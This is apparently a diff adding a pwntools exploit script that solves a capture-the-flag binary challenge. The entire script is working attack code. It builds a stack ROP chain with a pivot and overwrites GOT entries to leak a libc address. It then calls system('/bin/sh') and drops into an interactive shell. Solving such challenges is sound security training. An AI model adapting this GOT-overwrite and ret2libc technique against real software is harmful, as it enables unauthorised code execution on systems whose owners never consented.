@@ -1,0 +1,64 @@
+from pwn import *
+
+e = ELF("./chall_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+script = '''
+b *main
+b *main + 76
+'''
+
+p = process("./chall_patched")
+#p = gdb.debug("./chall_patched", gdbscript = script)
+
+main = 0x0000000000401274
+pop_rbp = 0x00000000004011bd
+strlen_got = e.got['strlen']
+setvbuf_got = e.got['setvbuf']
+setup = 0x000000000040121a
+stderr = 0x404080
+rw_section = 0x404800
+leave_ret = 0x00000000004012cb
+
+# perform ROP on stack
+payload = b"\x00" * 0x40
+payload += p64(strlen_got + 0x40) + p64(main)
+payload += p64(pop_rbp) + p64(setvbuf_got + 0x40)
+payload += p64(main) + p64(pop_rbp)
+payload += p64(stderr + 0x40) + p64(main)
+payload += p64(pop_rbp) + p64(rw_section + 0x40)
+payload += p64(main) + p64(pop_rbp)
+payload += p64(rw_section - 0x8) + p64(leave_ret)
+p.sendlineafter(b"Data: ", payload)
+
+# strlen -> setup
+payload = p64(setup)
+p.sendline(payload)
+p.recvuntil(b"playing :)\n")
+
+# setvbuf -> puts
+puts_plt = e.plt['puts']
+payload = p64(puts_plt)
+p.sendline(payload)
+p.recv(5)
+
+# stderr -> pointer of stdin
+stdin_ptr = 0x404070
+payload = p64(stdin_ptr)
+p.sendline(payload)
+libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21aaa0
+print(hex(libc_base))
+
+pop_rdi = libc_base + 0x000000000002a3e5
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+ret = pop_rdi + 1
+print(hex(pop_rdi))
+
+# perform ROP on read write section
+payload = p64(pop_rdi) + p64(binsh)
+payload += p64(system)
+p.sendline(payload)
+
+p.interactive()
